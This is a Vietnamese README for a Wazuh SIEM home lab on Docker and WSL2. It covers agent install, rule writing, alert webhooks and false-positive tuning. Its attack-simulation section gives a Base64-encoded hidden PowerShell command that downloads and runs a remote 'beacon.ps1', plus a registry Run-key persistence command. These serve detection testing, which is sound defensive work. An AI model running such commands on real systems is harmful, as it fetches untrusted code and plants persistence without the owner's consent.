# 🛡️ Wazuh SIEM & Agent Lab (Windows + Docker + WSL2)

> Lab thực hành an ninh mạng: Triển khai cụm **Wazuh SIEM (Manager, Indexer, Dashboard)** chạy trên **Docker Desktop (WSL2 backend)** trên Windows. Cài đặt **Wazuh Agent** trên chính máy Windows để giám sát như môi trường Production. Sử dụng môi trường **WSL2** để bơm payload tấn công vào Agent, đọc dữ liệu sự kiện, tự thiết kế các luật cảnh báo (Custom Rules) và cấu hình gửi thông báo cảnh báo (Alert Notifications).

---

## 📌 1. Kiến trúc Hệ thống

```
[ Windows 10/11 Host ]
 ├── 1. Wazuh SIEM Cluster (Docker Desktop / WSL2 Backend)
 │    ├── wazuh.manager    (Port 1514: Nhận log agent, Port 1515: Đăng ký agent, Port 55000: API)
 │    ├── wazuh.indexer    (Port 9200: OpenSearch, khống chế RAM 512MB)
 │    └── wazuh.dashboard  (Port 443: Web UI quản trị và điều tra cảnh báo)
 │
 ├── 2. Wazuh Agent (Cài trực tiếp trên Windows)
 │    └── Kết nối tới Wazuh Manager qua 127.0.0.1 (Port 1514, 1515)
 │    └── Giám sát Windows Event Log, Sysmon, Command Execution, Registry
 │
 └── 3. Môi trường WSL2 (Ubuntu trên Windows)
      ├── Tự bơm payload, quét cổng, bắn HTTP payload, kích hoạt lệnh kiểm thử
      ├── Mount thư mục chia sẻ shared-logs/ để nạp thêm dataset khi cần
      └── Tự thiết kế luật phát hiện trong rules/local_rules.xml
```

---

## 📂 2. Cấu trúc Thư mục

```plaintext
My-SOC-Lab/
├── .wslconfig                             # Giới hạn 4GB RAM cho WSL2 trên Windows
├── README.md                              # Hướng dẫn dựng lab, cài agent, bơm payload và viết rule
├── PROJECT_PLAN.md                        # Quy trình vận hành và kịch bản tấn công thực tế
├── docker-compose.yml                     # Cụm Wazuh SIEM Single-Node tối ưu RAM
├── config/
│   └── wazuh_manager.conf                 # Cấu hình nguồn log và kênh thông báo (Slack/Webhook)
├── rules/
│   └── local_rules.xml                    # Nơi tự viết và tinh chỉnh luật phát hiện cảnh báo
├── shared-logs/                           # Thư mục chứa log để nạp hoặc mount trực tiếp
│   ├── web_access.log
│   ├── linux_auth.log
│   └── windows_sysmon.json
├── datasets/                              # Dữ liệu payload và log tấn công mẫu để kiểm thử
│   ├── owasp_sqli.log
│   ├── openssh_bruteforce.log
│   ├── windows_sysmon_execution.json
│   └── windows_sysmon_benign.json
└── scripts/
    ├── feed_logs.sh                       # Script bash bơm log mẫu từ WSL vào shared-logs
    └── triage_ioc_checker.py              # Script Python tra cứu IP và Hash độc hại
```

---

## 🚀 3. Hướng dẫn Dựng Lab từ Đầu

### Bước 1: Khống chế RAM cho WSL2
Copy tệp `.wslconfig` vào thư mục người dùng Windows (`%UserProfile%\.wslconfig`):
```ini
[wsl2]
memory=4GB
processors=2
swap=2GB
```
Khởi động lại WSL qua PowerShell:
```cmd
wsl --shutdown
```

### Bước 2: Bật Cụm Wazuh SIEM trên Docker
Mở PowerShell hoặc terminal WSL tại thư mục dự án và chạy:
```bash
docker compose up -d
```
Đợi khoảng 1-2 phút cho các container khởi động hoàn tất. Truy cập giao diện Web Dashboard:
- Địa chỉ: `https://localhost`
- Tài khoản: `admin`
- Mật khẩu: `SecretPassword123!`

---

## 💻 4. Cài Đặt Wazuh Agent trên Windows (Production Mode)

Tải bộ cài đặt chính thức của Wazuh Agent cho Windows (`.msi`) từ trang chủ Wazuh hoặc chạy qua PowerShell với quyền Administrator:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.2-1.msi -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER='127.0.0.1' WAZUH_REGISTRATION_SERVER='127.0.0.1' WAZUH_AGENT_NAME='WIN-ENDPOINT'
NET START WazuhSvc
```

Sau khi dịch vụ khởi động, vào giao diện Wazuh Dashboard mục **Agents**, trạm làm việc Windows sẽ hiển thị trạng thái **Active**.

---

## 🎯 5. Tự Thêm Payload từ WSL để Agent Ghi Nhận

Từ cửa sổ dòng lệnh WSL, thực hiện các hành động kích hoạt sự kiện để Windows Agent ghi log và gửi về Wazuh Manager:

### 1. Kích hoạt lệnh PowerShell mã hóa (Base64) trên Windows từ WSL:
```bash
powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==
```

### 2. Kích hoạt hành vi cài cắm khóa tự khởi động (Persistence) trên Windows:
```bash
powershell.exe -Command "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateCheck /t REG_SZ /d C:\Users\Public\update.exe /f"
```

### 3. Bơm log tấn công Web hoặc SSH vào tệp giám sát:
```bash
bash scripts/feed_logs.sh web
bash scripts/feed_logs.sh ssh
```

---

## 🔧 6. Thiết Kế Luật Cảnh Báo (`rules/local_rules.xml`)

Chỉnh sửa tệp `rules/local_rules.xml` để tạo luật phát hiện theo nhu cầu.

Mỗi lần chỉnh sửa xong, nạp lại cấu hình trong 2 giây mà không cần tắt container:
```bash
docker exec my-soc-lab-main-wazuh.manager-1 /var/ossec/bin/wazuh-control restart
```

Kiểm tra cú pháp và khả năng giải mã của log bằng công cụ `wazuh-logtest`:
```bash
docker exec -it my-soc-lab-main-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
```

---

## 🔔 7. Cấu Hình Thông Báo Cảnh Báo (Alert Notifications)

Trong tệp `config/wazuh_manager.conf`, cấu hình kênh nhận thông báo tự động khi nổ cảnh báo mức độ cao (Level >= 10):

### Gửi thông báo qua Webhook / Slack:
Điền URL webhook vào thẻ `<hook_url>`:
```xml
<integration>
  <name>slack</name>
  <hook_url>https://hooks.slack.com/services/YOUR_WEBHOOK_URL</hook_url>
  <level>10</level>
  <alert_format>json</alert_format>
</integration>
```

### Gửi thông báo qua Custom Webhook (Telegram, Discord, Webhook.site):
```xml
<integration>
  <name>custom-webhook</name>
  <hook_url>https://webhook.site/YOUR_UUID</hook_url>
  <level>10</level>
  <alert_format>json</alert_format>
</integration>
```

---

## 🧹 8. Tinh Chỉnh và Lọc Cảnh Báo (Rule Tuning)

Khi gặp cảnh báo giả (False Positive) từ các chương trình hợp lệ, thêm luật loại trừ vào `rules/local_rules.xml` với `level="0"`:

```xml
<rule id="100401" level="0">
  <if_sid>100301</if_sid>
  <field name="win.eventdata.user" type="pcre2">(?i)^DOMAIN\\svc_backup$</field>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)\\svchost\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)Backup_Routine\.ps1</field>
  <description>Tuning: Whitelist authorized IT Backup Service account</description>
</rule>
```
Luật này giúp loại bỏ toàn bộ cảnh báo giả của tiến trình sao lưu định kỳ mà không làm ảnh hưởng đến việc bắt payload của kẻ tấn công thật.
